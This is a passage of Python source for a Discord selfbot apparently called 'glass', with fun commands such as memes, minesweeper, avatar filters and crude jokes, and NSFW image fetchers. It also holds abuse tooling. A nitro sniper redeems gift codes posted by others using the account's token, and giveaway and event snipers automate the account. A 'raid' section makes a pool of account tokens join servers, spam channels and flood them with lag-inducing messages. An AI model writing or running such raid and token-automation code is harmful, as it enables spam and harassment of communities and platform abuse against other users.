        json.dump(configs, f, indent=4)
    nitro_sniper = not nitro_sniper
    await ctx.send(f"```yaml\nNitro sniper set to: {nitro_sniper}```", delete_after=5)


# giveawaydelay
@glass.command()
async def giveawaydelay(ctx, *, give_delay=None):
    await ctx.message.delete()
    if give_delay:
        try:
            give_delay = int(give_delay)
            with open('config.json', 'r') as f:
                configs = json.load(f)
            configs['sniper']['giveaway delay'] = give_delay
            with open('config.json', 'w') as f:
                json.dump(configs, f, indent=4)
            global giveaway_delay
            giveaway_delay = give_delay
            await ctx.send(f"```yaml\nGiveaway delay set to: {give_delay}```", delete_after=5)
        except:
            await ctx.send(f"```yaml\nPlease put in a valid delay to wait```", delete_after=5)
    else:
        await ctx.send(f"```yaml\nPlease put in a delay for the giveaway sniper```", delete_after=5)


# reload configs
@glass.command()
async def reload(ctx):
    await ctx.message.delete()
    message = await ctx.send("```yaml\nReloading Configs...```")
    get_config()
    await message.edit(content="```yaml\nFinished Reloading```", delete_after=5)


# fun

# copy
# @glass.command()
# async def copy(ctx, *, user: discord.User):
#     await ctx.message.delete()
#     await ctx.send(user.id)


# meme
@glass.command()
async def meme(ctx):
    await ctx.message.delete()
    result = requests.get("https://meme-api.herokuapp.com/gimme").json()
    await ctx.send(f"**__{result['title']}__**\n<{result['postLink']}>")
    await ctx.send(result['url'])


# lmgtfy
@glass.command()
async def lmgtfy(ctx, *, message=None):
    await ctx.message.delete()
    if message:
        text = urlencode({"q": message})
        await ctx.send(f'<https://lmgtfy.com/?{text}>')
    else:
        await ctx.send("```yaml\nPlease put in text```", delete_after=5)


# tts
@glass.command()
async def tts(ctx, *, message=None):
    await ctx.message.delete()
    if message:
        f = io.BytesIO()
        tts = gTTS(text=message.lower(), lang='en')
        tts.write_to_fp(f)
        f.seek(0)
        await ctx.send(file=discord.File(f, f"{message}.mp3"))
    else:
        await ctx.send("```yaml\nPlease put in text```", delete_after=5)


# dick
@glass.command(aliases=['dickcalc', 'dickcalculator'])
async def dick(ctx, user: discord.User=None):
    await ctx.message.delete()
    if user == None:
        user = glass.user
    size = random.randint(1, 20)
    length = ""
    for inch in range(0, size):
        length += "="
    message = f"```\nDick Calculator 9000\n\n{user.name}'s dick length is\n8{length}D```"
    await ctx.send(message)


# gay
@glass.command(aliases=['gaycalc', 'gaycalculator'])
async def gay(ctx, user: discord.User=None):
    await ctx.message.delete()
    if user == None:
        user = glass.user
    percent = random.randint(0, 100)
    message = f"```\nGay Calculator 9000\n\n{user.name} is {percent}% gay```"
    await ctx.send(message)


# minesweeper
@glass.command()
async def minesweeper(ctx, size: int = 5):
    await ctx.message.delete()
    m_offets = [(-1, -1), (0, -1), (1, -1), (-1, 0), (1, 0), (-1, 1), (0, 1), (1, 1)]
    m_numbers = [":one:", ":two:", ":three:", ":four:", ":five:", ":six:"]
    size = max(min(size, 8), 2)
    bombs = [[random.randint(0, size - 1), random.randint(0, size - 1)] for x in range(int(size - 1))]
    is_on_board = lambda x, y: 0 <= x < size and 0 <= y < size
    has_bomb = lambda x, y: [i for i in bombs if i[0] == x and i[1] == y]
    message = "**Click to play**:\n"
    for y in range(size):
        for x in range(size):
            tile = "||{}||".format(chr(11036))
            if has_bomb(x, y):
                tile = "||{}||".format(chr(128163))
            else:
                count = 0
                for xmod, ymod in m_offets:
                    if is_on_board(x + xmod, y + ymod) and has_bomb(x + xmod, y + ymod):
                        count += 1
                if count != 0:
                    tile = "||{}||".format(m_numbers[count - 1])
            message += tile
        message += "\n"
    await ctx.send(message)


# kiss
@glass.command()
async def kiss(ctx, user: discord.User):
    await ctx.message.delete()
    result = requests.get("https://nekos.life/api/v2/img/kiss").json()
    await ctx.send(f"Aww! {glass.user.mention} kissed {user.mention}\n{result['url']}")


# hug
@glass.command()
async def hug(ctx, user: discord.User):
    await ctx.message.delete()
    result = requests.get("https://nekos.life/api/v2/img/hug").json()
    await ctx.send(f"Aww! {glass.user.mention} hugged {user.mention}\n{result['url']}")


# slap
@glass.command()
async def slap(ctx, user: discord.User):
    await ctx.message.delete()
    result = requests.get("https://nekos.life/api/v2/img/slap").json()
    await ctx.send(f"Ouch! {glass.user.mention} slapped {user.mention}\n{result['url']}")


# pat
@glass.command()
async def pat(ctx, user: discord.User):
    await ctx.message.delete()
    result = requests.get("https://nekos.life/api/v2/img/pat").json()
    await ctx.send(f"Yay! {glass.user.mention} patted {user.mention}\n{result['url']}")


# poke
@glass.command()
async def poke(ctx, user: discord.User):
    await ctx.message.delete()
    result = requests.get("https://nekos.life/api/v2/img/poke").json()
    await ctx.send(f"Boop! {glass.user.mention} poked {user.mention}\n{result['url']}")


# cuddle
@glass.command()
async def cuddle(ctx, user: discord.User):
    await ctx.message.delete()
    result = requests.get("https://nekos.life/api/v2/img/cuddle").json()
    await ctx.send(f"Aww! {glass.user.mention} cuddled with {user.mention}\n{result['url']}")


# feed
@glass.command()
async def feed(ctx, member: discord.User):
    await ctx.message.delete()
    result = requests.get("https://nekos.life/api/v2/img/feed").json()
    await ctx.send(f"Yay! {glass.user.mention} fed {member.mention}\n{result['url']}")


# image

#tweet
@glass.command()
async def tweet(ctx, username, *, message: str):
    await ctx.message.delete()
    if (username) and (message):
        res = requests.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}")
        res = res.json()
        await ctx.send(res['message'])
    else:
        await ctx.send("```yaml\nPlease fill out a username and message```", delete_after=5)


# gay
@glass.command()
async def gayavatar(ctx, user: discord.User=None):
    await ctx.message.delete()
    if user:
        try:
            await ctx.send(f"https://some-random-api.ml/canvas/gay?avatar={user.avatar_url_as(static_format='png')}")
        except:
            await ctx.send("```yaml\nFailed to get user's avatar```", delete_after=5)
    else:
        await ctx.send("```yaml\nPlease input a user to modify their avatar```", delete_after=5)


# glass
@glass.command()
async def glassavatar(ctx, user: discord.User=None):
    await ctx.message.delete()
    if user:
        try:
            await ctx.send(f"https://some-random-api.ml/canvas/glass?avatar={user.avatar_url_as(static_format='png')}")
        except:
            await ctx.send("```yaml\nFailed to get user's avatar```", delete_after=5)
    else:
        await ctx.send("```yaml\nPlease input a user to modify their avatar```", delete_after=5)


# wasted
@glass.command()
async def wasted(ctx, user: discord.User=None):
    await ctx.message.delete()
    if user:
        try:
            await ctx.send(f"https://some-random-api.ml/canvas/wasted?avatar={user.avatar_url_as(static_format='png')}")
        except:
            await ctx.send("```yaml\nFailed to get user's avatar```", delete_after=5)
    else:
        await ctx.send("```yaml\nPlease input a user to modify their avatar```", delete_after=5)


# triggered
@glass.command()
async def triggered(ctx, user: discord.User=None):
    await ctx.message.delete()
    if user:
        try:
            await ctx.send(f"https://some-random-api.ml/canvas/triggered?avatar={user.avatar_url_as(static_format='png')}")
        except:
            await ctx.send("```yaml\nFailed to get user's avatar```", delete_after=5)
    else:
        await ctx.send("```yaml\nPlease input a user to modify their avatar```", delete_after=5)


# grayscale
@glass.command()
async def grayscale(ctx, user: discord.User=None):
    await ctx.message.delete()
    if user:
        try:
            await ctx.send(f"https://some-random-api.ml/canvas/greyscale?avatar={user.avatar_url_as(static_format='png')}")
        except:
            await ctx.send("```yaml\nFailed to get user's avatar```", delete_after=5)
    else:
        await ctx.send("```yaml\nPlease input a user to modify their avatar```", delete_after=5)


# invert
@glass.command()
async def invert(ctx, user: discord.User=None):
    await ctx.message.delete()
    if user:
        try:
            await ctx.send(f"https://some-random-api.ml/canvas/invert?avatar={user.avatar_url_as(static_format='png')}")
        except:
            await ctx.send("```yaml\nFailed to get user's avatar```", delete_after=5)
    else:
        await ctx.send("```yaml\nPlease input a user to modify their avatar```", delete_after=5)


# blur
@glass.command()
async def blur(ctx, user: discord.User=None):
    await ctx.message.delete()
    if user:
        try:
            await ctx.send(f"https://some-random-api.ml/canvas/blur?avatar={user.avatar_url_as(static_format='png')}")
        except:
            await ctx.send("```yaml\nFailed to get user's avatar```", delete_after=5)
    else:
        await ctx.send("```yaml\nPlease input a user to modify their avatar```", delete_after=5)


# NSFW

# pussy
@glass.command()
async def pussy(ctx):
    await ctx.message.delete()
    result = requests.get("https://nekos.life/api/v2/img/pussy").json()
    await ctx.send(result['url'])


# boobs
@glass.command()
async def boobs(ctx):
    await ctx.message.delete()
    result = requests.get("https://nekos.life/api/v2/img/boobs").json()
    await ctx.send(result['url'])


# hentai
@glass.command()
async def hentai(ctx):
    await ctx.message.delete()
    result = requests.get("https://nekos.life/api/v2/img/hentai").json()
    await ctx.send(result['url'])


# blowjob
@glass.command()
async def blowjob(ctx):
    await ctx.message.delete()
    result = requests.get("https://nekos.life/api/v2/img/blowjob").json()
    await ctx.send(result['url'])


# feet
@glass.command()
async def feet(ctx):
    await ctx.message.delete()
    result = requests.get("https://nekos.life/api/v2/img/feet").json()
    await ctx.send(result['url'])


# sniper

# nitro sniper
@glass.event
async def on_message(message):
    time = datetime.datetime.now().strftime("%H:%M %p")
    if nitro_sniper == True:
        if message.author != glass.user:
            if 'discord.gift/' in message.content:
                start = datetime.datetime.now()
                code = re.search("discord.gift/(.*)", message.content).group(1)
                headers = {'Authorization': token, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
                r = requests.post(f'https://discordapp.com/api/v8/entitlements/gift-codes/{code}/redeem',headers=headers).text
                elapsed = datetime.datetime.now() - start
                elapsed = f'{elapsed.seconds}.{elapsed.microseconds}'
                if 'This gift has been redeemed already.' in r:
                    print(f"[Nitro Already Redeemed]\nServer: {message.guild}\nChannel: {message.channel}\nAuthor: {message.author}\nTime Elapsed: {elapsed}\nCode: {code}\n")
                elif 'subscription_plan' in r:
                    print(f"[Nitro Success]\nServer: {message.guild}\nChannel: {message.channel}\nAuthor: {message.author}\nTime Elapsed: {elapsed}\nCode: {code}\n")
                elif 'Unknown Gift Code' in r:
                    print(f"[Unknown Gift Code]\nServer: {message.guild}\nChannel: {message.channel}\nAuthor: {message.author}\nTime Elapsed: {elapsed}\nCode: {code}\n")
                else:
                    print(f"[Failed]\nFailed to redeem code. You are being ratelimited!")
    await glass.process_commands(message)


# giveaway sniper
@glass.listen()
async def on_message(message):
    if giveaway_sniper == True:
        if '**GIVEAWAY**' in message.content:
            if str(message.author.id) in giveaway_ids:
                await asyncio.sleep(giveaway_delay)
                emoji = giveaway_list[str(message.author.id)]
                try:
                    await message.add_reaction(emoji)
                    print(f"[Giveaway Successfully Joined]\nServer: {message.guild}\nChannel: {message.channel}\n")
                except discord.errors.Forbidden:
                    print(f"[Couldn't react to giveaway]\nServer: {message.guild}\nChannel: {message.channel}\n")


# raid

# rjoin
@glass.command()
async def rjoin(ctx, invite_code=None):
    await ctx.message.delete()
    if invite_code:
        message = await ctx.send(f"```yaml\nBots now joining using {invite_code}```")
        for rtoken in rtokens:
            headers = {"Content-Type": "application/json", "Authorization": rtoken}
            async with aiohttp.ClientSession() as session:
                async with session.post(f"https://discord.com/api/v8/invites/{invite_code}", headers=headers) as result:
                    if result.status > 199 and result.status < 300:
                        pass
                    else:
                        print(f"{rtoken} failed to join")
                print(f"{rtoken} failed to join")
        await message.edit(content=f"```yaml\nAll {len(rtokens)} bots joined```", delete_after=5)
    else:
        await ctx.send("```yaml\nPlease put in an invite code for the bots to join with```", delete_after=5)


# rleave
@glass.command()
async def rleave(ctx, guild_id=None):
    await ctx.message.delete()
    if guild_id:
        try:
            guild_id = int(guild_id)
            message = await ctx.send(f"```yaml\nBots now leaving {guild_id}```")
            for rtoken in rtokens:
                headers = {"Authorization": rtoken}
                async with aiohttp.ClientSession() as session:
                    async with session.delete(f"https://discord.com/api/v8/users/@me/guilds/{guild_id}", headers=headers) as result:
                        if result.status > 199 and result.status < 300:
                            pass
                        else:
                            print(f"{rtoken} failed to leave")
            await message.edit(content=f"```yaml\nAll {len(rtokens)} bots left```", delete_after=5)
        except:
            await ctx.send("```yaml\nPlease enter a valid server ID```", delete_after=5)
    else:
        await ctx.send("```yaml\nPlease put in a server ID for the bots to leave```", delete_after=5)


# rspam
@glass.command()
async def rspam(ctx, channel_id=None, count=None, *, text=None):
    await ctx.message.delete()
    if channel_id and count and text:
        try:
            channel_id = int(channel_id)
        except:
            await ctx.send("```yaml\nPlease put in a valid channel ID```", delete_after=5)
            return
        try:
            count = int(count)
        except:
            await ctx.send("```yaml\nPlease put in a valid amount to spam```", delete_after=5)
            return
        message = await ctx.send(f"```yaml\nBots now sending {text}, {count} times in {channel_id}```")
        data = json.dumps({"content": text})
        for i in range(count):
            for rtoken in rtokens:
                headers = {"Content-Type": "application/json", "Authorization": rtoken}
                async with aiohttp.ClientSession() as session:
                    async with session.post(f"https://discordapp.com/api/channels/{channel_id}/messages", headers=headers, data=data) as result:
                        pass
        await message.edit(content=f"```yaml\nAll {len(rtokens)} finished sending {text}, {count} times in {channel_id}```", delete_after=5)
    else:
        await ctx.send("```yaml\nPlease fill in all fields```", delete_after=5)


# rlag
@glass.command()
async def rlag(ctx, channel_id=None, count=None):
    await ctx.message.delete()
    if count and channel_id:
        try:
            channel_id = int(channel_id)
        except:
            await ctx.send("```yaml\nPlease put in a valid channel ID```", delete_after=5)
            return
        try:
            count = int(count)
        except:
            await ctx.send("```yaml\nPlease put in a valid amount to spam```", delete_after=5)
            return
        message = await ctx.send(f"```yaml\nSending lag {count} times in {channel_id}```")
        data = json.dumps({"content": "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||"})
        for i in range(count):
            for rtoken in rtokens:
                headers = {"Content-Type": "application/json", "Authorization": rtoken}
                async with aiohttp.ClientSession() as session:
                    async with session.post(f"https://discordapp.com/api/channels/{channel_id}/messages", headers=headers, data=data) as result:
                        pass
        await message.edit(content=f"```yaml\nFinished sending the lag message {count} times in {channel_id}```", delete_after=5)
    else:
        await ctx.send("```yaml\nPlease put in the amount of times you want the lag message to be sent```", delete_after=5)


# dank
# @glass.command()
# async def dstart(ctx):


# daddchannel
@glass.command()
async def daddchannel(ctx, *, channel: discord.TextChannel):
    await ctx.message.delete()
    with open('config.json', 'r') as f:
        configs = json.load(f)
    configs['dank']['channels'].append(channel.id)
    with open('config.json', 'w') as f:
        json.dump(configs, f, indent=4)
    global dank_channels
    dank_channels.append(channel.id)
    await ctx.send(f"```yaml\nAdded #{channel.name} to event channel list```", delete_after=5)


# dremovechannel
@glass.command()
async def dremovechannel(ctx, *, channel: discord.TextChannel):
    await ctx.message.delete()
    with open('config.json', 'r') as f:
        configs = json.load(f)
    configs['dank']['channels'].remove(channel.id)
    with open('config.json', 'w') as f:
        json.dump(configs, f, indent=4)
    global dank_channels
    dank_channels.remove(channel.id)
    await ctx.send(f"```yaml\nRemoved #{channel.name} from event channel list```", delete_after=5)


# dwhitelist
@glass.command()
async def dwhitelist(ctx):
    await ctx.message.delete()
    global dank_whitelist
    with open('config.json', 'r') as f:
        configs = json.load(f)
    configs['dank']['channel whitelist'] = not dank_whitelist
    with open('config.json', 'w') as f:
        json.dump(configs, f, indent=4)
    dank_whitelist = not dank_whitelist
    await ctx.send(f"```yaml\nDank Memer channel whitelist set to: {dank_whitelist}```", delete_after=5)


# event joiner
@glass.listen()
async def on_message(message):
    if message.author.id == 270904126974590976:
        if message.content.startswith('Type `') or message.content.startswith('Attack the boss by typing `'):
            if dank_whitelist == True:
                if message.channel.id in dank_channels:
                    await asyncio.sleep(event_delay)
                    await message.channel.send(((re.search('`(.+?)`', message.content).group(1)).encode('ascii', 'ignore')).decode('utf-8'))
            else:
                if message.channel.id not in dank_channels:
                    await asyncio.sleep(event_delay)
                    await message.channel.send(((re.search('`(.+?)`', message.content).group(1)).encode('ascii', 'ignore')).decode('utf-8'))


# fake nitro
@glass.listen()
async def on_message(message):
    def replace(text):
        for word, emoji in fake_nitro.items():
            text = text.replace(f"{fake_nitro_prefix}{word}", f"**{word}**({emoji})")
        return text
    if message.author == glass.user:
        if any(f"{fake_nitro_prefix}{word}" in message.content.lower() for word in nitro_words):
            text = replace(message.content.lower())
            await message.edit(content=text)


@glass.command()
async def emojidump(ctx, server=None):
    await ctx.message.delete()
    if server == None:
        if isinstance(ctx.channel, discord.channel.DMChannel):
            await ctx.send("```yaml\nPlease use this in a server or put in a server id```", delete_after=5)
            return
        else:
            server = ctx.guild
    else:
        server = glass.get_guild(int(server))
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36'}
    emoji_names = []
    for emoji in server.emojis:
        if emoji.animated:
            extension = "gif"
        else:
            extension = "png"
        count = emoji_names.count(emoji.name)
        response = requests.get(emoji.url, stream=True, headers=headers)
        if count == 0:
            with open(f"images\\{emoji.name}.{extension}", 'wb') as out_file:
                shutil.copyfileobj(response.raw, out_file)
        else:
            with open(f"images\\{emoji.name}~{count}.{extension}", 'wb') as out_file:
                shutil.copyfileobj(response.raw, out_file)
        emoji_names.append(emoji.name)
    print("finished")


@glass.command()
async def rick(ctx):
    await ctx.message.edit(content="""We're no strangers to love
You know the rules and so do I
A full commitment's what I'm thinking of
You wouldn't get this from any other guy
I just wanna tell you how I'm feeling
Gotta make you understand
Never gonna give you up
Never gonna let you down
Never gonna run around and desert you
Never gonna make you cry
Never gonna say goodbye
Never gonna tell a lie and hurt you
We've known each other for so long
Your heart's been aching but you're too shy to say it
Inside we both know what's been going on
We know the game and we're gonna play it
And if you ask me how I'm feeling
Don't tell me you're too blind to see
Never gonna give you up
Never gonna let you down
Never gonna run around and desert you
Never gonna make you cry
Never gonna say goodbye
Never gonna tell a lie and hurt you
Never gonna give you up
Never gonna let you down
Never gonna run around and desert you
Never gonna make you cry
Never gonna say goodbye
Never gonna tell a lie and hurt you
Never gonna give, never gonna give
(Give you up)
(Ooh) Never gonna give, never gonna give
(Give you up)
We've known each other for so long
Your heart's been aching but you're too shy to say it
Inside we both know what's been going on
We know the game and we're gonna play it
I just wanna tell you how I'm feeling
Gotta make you understand
Never gonna give you up
Never gonna let you down
Never gonna run around and desert you
Never gonna make you cry
Never gonna say goodbye
Never gonna tell a lie and hurt you
Never gonna give you up
Never gonna let you down
Never gonna run around and desert you
Never gonna make you cry
Never gonna say goodbye
Never gonna tell a lie and hurt you
Never gonna give you up
Never gonna let you down
Never gonna run around and desert you
Never gonna make you cry""")


@glass.command()
async def notfunny(ctx):
    await ctx.message.delete()
    await ctx.send("Not funny I didn't laugh. Your joke is so bad I would have preferred the joke went over my head and you gave up re-telling me the joke. To be honest this is a horrid attempt at trying to get a laugh out of me. Not a chuckle, not a hehe, not even a subtle burst of air out of my esophagus. Science says before you laugh your brain preps your face muscles but I didn't even feel the slightest twitch. 0/10 this joke is so bad I cannot believe anyone legally allowed you to be creative at all. The amount of brain power you must have put into that joke has the potential to power every house on Earth. Get a personality and learn how to make jokes, read a book. I'm not saying this to be funny I genuinely mean it on how this is just bottom barrel embarrassment at comedy. You've single handedly killed humor and every comedic act on the planet. I'm so disappointed that society has failed as a whole in being able to teach you how to be funny. Honestly if I put in all my power and time to try and make your joke funny it would require Einstein himself to build a device to strap me into so I can be connected to the energy of a billion stars to do it, and even then all that joke would get from people is a subtle scuff.")
    await ctx.send("You're lucky I still have the slightest of empathy for you after telling that joke otherwise I would have committed every war crime in the book just to prevent you from attempting any humor ever again. We should put that joke in text books so future generations can be wary of becoming such an absolute comedic failure. Im disappointed, hurt, and outright offended that my precious time has been wasted in my brain understanding that joke. In the time that took I was planning on helping kids who have been orphaned, but because of that you've waisted my time explaining the obscene integrity of your terrible attempt at comedy. Now those kids are suffering without meals and there's nobody to blame but you. I hope you're happy with what you have done and I truly hope you can move on and learn from this piss poor attempt")


@glass.command()
async def fortnut(ctx):
    await ctx.message.delete()
    message = await ctx.send("""```
    ⣀⣤
⠀⠀⠀⠀⣿⠿⣶
⠀⠀⠀⠀⣿⣿⣀
⠀⠀⠀⣶⣶⣿⠿⠛⣶
⠤⣀⠛⣿⣿⣿⣿⣿⣿⣭⣿⣤
⠒⠀⠀⠀⠉⣿⣿⣿⣿⠀⠀⠉⣀
⠀⠤⣤⣤⣀⣿⣿⣿⣿⣀⠀⠀⣿
⠀⠀⠛⣿⣿⣿⣿⣿⣿⣿⣭⣶⠉
⠀⠀⠀⠤⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⣭⣿⣿⣿⠀⣿⣿⣿
⠀⠀⠀⣉⣿⣿⠿⠀⠿⣿⣿
⠀⠀⠀⠀⣿⣿⠀⠀⠀⣿⣿⣤
⠀⠀⠀⣀⣿⣿⠀⠀⠀⣿⣿⣿
⠀⠀⠀⣿⣿⣿⠀⠀⠀⣿⣿⣿
⠀⠀⠀⣿⣿⠛⠀⠀⠀⠉⣿⣿
⠀⠀⠀⠉⣿⠀⠀⠀⠀⠀⠛⣿
⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⣿⣿
⠀⠀⠀⠀⣛⠀⠀⠀⠀⠀⠀⠛⠿⠿⠿
⠀⠀⠀⠛⠛
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
   ⣀⣶⣀
⠀⠀⠀⠒⣛⣭
⠀⠀⠀⣀⠿⣿⣶
⠀⣤⣿⠤⣭⣿⣿
⣤⣿⣿⣿⠛⣿⣿⠀⣀
⠀⣀⠤⣿⣿⣶⣤⣒⣛
⠉⠀⣀⣿⣿⣿⣿⣭⠉
⠀⠀⣭⣿⣿⠿⠿⣿
⠀⣶⣿⣿⠛⠀⣿⣿
⣤⣿⣿⠉⠤⣿⣿⠿
⣿⣿⠛⠀⠿⣿⣿
⣿⣿⣤⠀⣿⣿⠿
⠀⣿⣿⣶⠀⣿⣿⣶
⠀⠀⠛⣿⠀⠿⣿⣿
⠀⠀⠀⣉⣿⠀⣿⣿
⠀⠶⣶⠿⠛⠀⠉⣿
⠀⠀⠀⠀⠀⠀⣀⣿
⠀⠀⠀⠀⠀⣶⣿⠿
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⠶⠀⠀⣀⣀
⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣶⣿⣿⣿⣿⣿⣿
⠀⠀⣀⣶⣤⣤⠿⠶⠿⠿⠿⣿⣿⣿⣉⣿⣿
⠿⣉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⣤⣿⣿⣿⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⣶⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⣿⣿⠿⣛⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠛⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⠿⠀⣿⣿⣿⠛
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⣿⠀⠀⣿⣶
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠛⠀⠀⣿⣿⣶
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⠤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
⠀⠀⣀
⠀⠿⣿⣿⣀
⠀⠉⣿⣿⣀
⠀⠀⠛⣿⣭⣀⣀⣤
⠀⠀⣿⣿⣿⣿⣿⠛⠿⣶⣀
⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⣉⣶
⠀⠀⠉⣿⣿⣿⣿⣀⠀⠀⣿⠉
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿
⠀⣀⣿⣿⣿⣿⣿⣿⣿⣿⠿
⠀⣿⣿⣿⠿⠉⣿⣿⣿⣿
⠀⣿⣿⠿⠀⠀⣿⣿⣿⣿
⣶⣿⣿⠀⠀⠀⠀⣿⣿⣿
⠛⣿⣿⣀⠀⠀⠀⣿⣿⣿⣿⣶⣀
⠀⣿⣿⠉⠀⠀⠀⠉⠉⠉⠛⠛⠿⣿⣶
⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿
⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉
⣀⣶⣿⠛
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
⠀⠀⠀⠀⠀⠀⠀⣀⣀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣿
⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣶⣿⣿⣿⣶⣶⣤⣶⣶⠶⠛⠉⠉
⠀⠀⠀⠀⠀⠀⣤⣿⠿⣿⣿⣿⣿⣿⠀⠀⠉
⠛⣿⣤⣤⣀⣤⠿⠉⠀⠉⣿⣿⣿⣿
⠀⠉⠉⠉⠉⠉⠀⠀⠀⠀⠉⣿⣿⣿⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⠛
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣛⣿⣿
⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⠛⠿⣿⣿⣿⣶⣤
⠀⠀⠀⠀⠀⠀⠀⣿⠛⠉⠀⠀⠀⠛⠿⣿⣿⣶⣀
⠀⠀⠀⠀⠀⠀⣿⣀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣶⣤
⠀⠀⠀⠀⠀⠛⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠉⠉
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
⠀⠀⠀⠀⠀⠀⣤⣶⣶
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣀⣀
⠀⠀⠀⠀⠀⣀⣶⣿⣿⣿⣿⣿⣿
⣤⣶⣀⠿⠶⣿⣿⣿⠿⣿⣿⣿⣿
⠉⠿⣿⣿⠿⠛⠉⠀⣿⣿⣿⣿⣿
⠀⠀⠉⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣤⣤
⠀⠀⠀⠀⠀⠀⠀⣤⣶⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⣀⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿
⠀⠀⠀⠀⣀⣿⣿⣿⠿⠉⠀⠀⣿⣿⣿⣿
⠀⠀⠀⠀⣿⣿⠿⠉⠀⠀⠀⠀⠿⣿⣿⠛
⠀⠀⠀⠀⠛⣿⣿⣀⠀⠀⠀⠀⠀⣿⣿⣀
⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⠿⣿⣿
⠀⠀⠀⠀⠀⠉⣿⣿⠀⠀⠀⠀⠀⠀⠉⣿
⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⣀⣿
⠀⠀⠀⠀⠀⠀⣀⣿⣿
⠀⠀⠀⠀⠤⣿⠿⠿⠿
```""")
    await asyncio.sleep(1)
    await message.edit(content="""```
⠀⠀⠀⠀⣀
⠀⠀⣶⣿⠿⠀⠀⠀⣀⠀⣤⣤
⠀⣶⣿⠀⠀⠀⠀⣿⣿⣿⠛⠛⠿⣤⣀
⣶⣿⣤⣤⣤⣤⣤⣿⣿⣿⣀⣤⣶⣭⣿⣶⣀
⠉⠉⠉⠛⠛⠿⣿⣿⣿⣿⣿⣿⣿⠛⠛⠿⠿
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⣿
